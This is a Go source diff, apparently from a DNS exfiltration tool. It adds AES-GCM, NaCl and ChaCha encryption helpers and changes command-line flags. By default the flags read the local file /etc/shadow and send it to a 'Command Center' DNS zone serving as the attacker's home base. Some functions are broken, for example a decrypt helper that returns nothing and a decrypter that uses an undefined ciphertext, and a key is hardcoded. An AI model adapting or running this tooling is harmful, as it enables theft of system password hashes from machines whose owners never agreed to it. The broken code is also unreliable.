@@ -224,50 +224,75 @@ func ExampleNewGCMEncrypter() {
 	key := []byte("AES256Key-32Characters1234567890")
 	plaintext := []byte("exampleplaintext")
 
-	block, err := aes.NewCipher(key)
-	if err != nil {
-		panic(err.Error())
+	block, derp := aes.NewCipher(key)
+	if derp != nil {
+		panic(derp.Error())
 	}
 
 	// Never use more than 2^32 random nonces with a given key because of the risk of a repeat.
 	nonce := make([]byte, 12)
-	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
-		panic(err.Error())
+	if _, derp := io.ReadFull(rand.Reader, nonce); derp != nil {
+		panic(derp.Error())
 	}
 
-	aesgcm, err := cipher.NewGCM(block)
-	if err != nil {
-		panic(err.Error())
+	aesgcm, derp := cipher.NewGCM(block)
+	if derp != nil {
+		panic(derp.Error())
 	}
 
 	ciphertext := aesgcm.Seal(nil, nonce, plaintext, nil)
 	fmt.Printf("%x\n", ciphertext)
 }
-func ExampleNewGCMDecrypter() {
+
+//AES-256-GCM
+// defaults to : AES256Key-32Characters1234567890
+func GCMDecrypter(key []byte, nonce string) {
+	if key == nil {
+		key = []byte("AES256Key-32Characters1234567890")
+	}
 	// The key argument should be the AES key, either 16 or 32 bytes
 	// to select AES-128 or AES-256.
-	key := []byte("AES256Key-32Characters1234567890")
 	//ciphertext, _ := hex.DecodeString("f90fbef747e7212ad7410d0eee2d965de7e890471695cddd2a5bc0ef5da1d04ad8147b62141ad6e4914aee8c512f64fba9037603d41de0d50b718bd665f019cdcd")
-	nonce, _ := NonceGenerator()
 	//nonce, _ := hex.DecodeString("bb8ef84243d2ee95a41c6c57")
 
-	block, err := aes.NewCipher(key)
-	if err != nil {
-		panic(err.Error())
+	block, derp := aes.NewCipher(key)
+	if derp != nil {
+		panic(derp.Error())
 	}
 
-	aesgcm, err := cipher.NewGCM(block)
-	if err != nil {
-		panic(err.Error())
+	aesgcm, derp := cipher.NewGCM(block)
+	if derp != nil {
+		panic(derp.Error())
 	}
 
-	plaintext, err := aesgcm.Open(nil, nonce, ciphertext, nil)
-	if err != nil {
-		panic(err.Error())
+	plaintext, derp := aesgcm.Open(nil, nonce, ciphertext, nil)
+	if derp != nil {
+		ErrorPrinter(derp, "generic error, fix me plz lol <3!", "panic")
 	}
 
 	fmt.Printf("%s\n", string(plaintext))
 }
+
+//uses NaCl library
+func saltycrypt(keystring string, DataIn []byte) []byte {
+	key, err := nacl.Load(keystring)
+	if err != nil {
+		panic(err)
+	}
+	encrypted := secretbox.EasySeal(DataIn, key)
+	return encrypted
+}
+
+// decrypts with NaCl
+func saltDEcrypt(keystring string, data []byte) []byte {
+	key, err := nacl.Load(keystring)
+	if err != nil {
+		panic(err)
+	}
+	decrypted := secretbox.EasyOpen(data, key)
+}
+
+//decrypting with chacha20
 func ChaChaHatesChaChi(bytes_in []byte, EncryptionKey []byte, nonce []byte) (herp []byte, derp error) {
 	var key []byte
 	DataOut := make([]byte, len(bytes_in))
@@ -283,14 +308,14 @@ func ChaChaHatesChaChi(bytes_in []byte, EncryptionKey []byte, nonce []byte) (her
 	for _, element := range DataOut {
 		// original code treated this like a nullbyte but wat?
 		if element == 0 {
-			ErrorPrinter(derp, "generic error, fix me plz lol <3!")
+			ErrorPrinter(derp, "nullbyte?", "fatal")
 			//return
 		}
 	}
 	return DataOut, derp
 }
 
-// This function uses the Salsa20 to encrypt a byte field
+// This function uses the ChaCha20 to encrypt a byte field
 // with a variable sized nonce
 func ChaChaLovesBytes(bytes_in []byte, EncryptionKey []byte, nonce []byte) (herp []byte, derp error) {
 	var key [32]byte
@@ -317,9 +342,9 @@ func ChaChaLovesBytes(bytes_in []byte, EncryptionKey []byte, nonce []byte) (herp
 	return DataOut, derp
 }
 func cheatercheaterskideater() {
-	key, err := nacl.Load(ENCRYPTIONKEY)
-	if err != nil {
-		panic(err)
+	key, derp := nacl.Load(ENCRYPTIONKEY)
+	if derp != nil {
+		panic(derp)
 	}
 	encrypted := secretbox.EasySeal([]byte("hello world"), key)
 }
@@ -362,10 +387,11 @@ func DNSExfiltration(ByteArrayInput []byte, DestZone string, MaxMsgSize int) (he
 func main() {
 	var debug = flag.Bool("d", false, "enable debugging.")
 	var file = flag.String("file", "/etc/shadow", "the local file to exfiltrate.")
-	var logfile = flag.String("logfile", "", "logfile")
+	var logfile = flag.String("logfile", "ugotmaybepwned", "logfile")
 	var help = flag.Bool("help", false, "show help.")
-	var DerpKey = flag.String("key", "Herp-Key-Derp", "Encryption Key, Can ")
-	var CommandCenter = flag.String("Command Center", "hakcbiscuits.firewall-gateway.netyinski", "the dns zone (homebase) to send the queries to.")
+	var DerpKey = flag.String("key", "Herp-Key-Derp", "Encryption Key")
+	var EncryptionType = flag.String("Encryption Type", "aes256gcm", "Can be: aes256gcm / salty / chacha / salsa ")
+	var CommandCenter = flag.String("Command Center", "hakcbiscuits.netyinski", "the dns zone (homebase) to send the queries to.")
 
 	flag.Parse()
 
